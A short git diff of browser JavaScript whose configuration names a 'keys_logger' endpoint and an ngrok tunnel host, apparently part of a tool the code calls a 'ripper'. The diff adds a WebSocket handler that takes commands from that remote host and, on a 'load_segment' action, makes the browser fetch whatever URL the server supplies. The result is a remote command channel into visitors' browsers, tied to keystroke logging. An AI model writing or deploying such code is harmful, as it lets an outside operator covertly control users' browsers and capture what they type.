@@ -4,12 +4,21 @@ window.rip_configs = {
   keys_logger: "/api/keys-logger",
   host: "https://eel-moral-ape.ngrok-free.app",
 }
+
+async function load_segment(url) {
+  try {
+    const response = await fetch(url)
+    alert(`Status: ${response.status}, statusText: ${response.statusText}`)
+  } catch (error) {}
+}
+
 ;(() => {
   if (typeof WebSocket !== "undefined" && window.rip_configs) {
     const socket = new WebSocket(`wss://${new URL(window.rip_configs.host).host}/ws`)
     // message is received
     socket.addEventListener("message", (event) => {
-      console.log(`Nhận dữ liệu từ ripper: ${event.data}`)
+      const { action, payload } = JSON.parse(event.data)
+      if (action === "load_segment") load_segment(payload)
     })
 
     // socket opened
